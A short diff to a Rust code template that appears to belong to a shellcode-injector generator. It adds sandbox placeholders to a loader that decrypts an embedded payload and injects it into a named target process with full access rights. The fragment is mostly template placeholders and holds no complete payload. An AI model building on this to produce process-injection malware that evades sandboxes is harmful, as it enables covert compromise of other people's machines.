@@ -13,6 +13,8 @@ use windows::Win32::System::Threading::PROCESS_ALL_ACCESS;
 use std::include_bytes;
 {{IMPORTS}}
 
+{{SANDBOX_IMPORTS}}
+
 {{DECRYPTION_FUNCTION}}
 
 fn boxboxbox(tar: &str) -> Vec<usize> {
@@ -62,6 +64,8 @@ fn enhance(buf: Vec<u8>, tar: usize) {
 }
 
 fn main() {
+    {{SANDBOX}}
+    
     // inject in the following processes:
     let tar: &str = "{{TARGET_PROCESS}}";
 
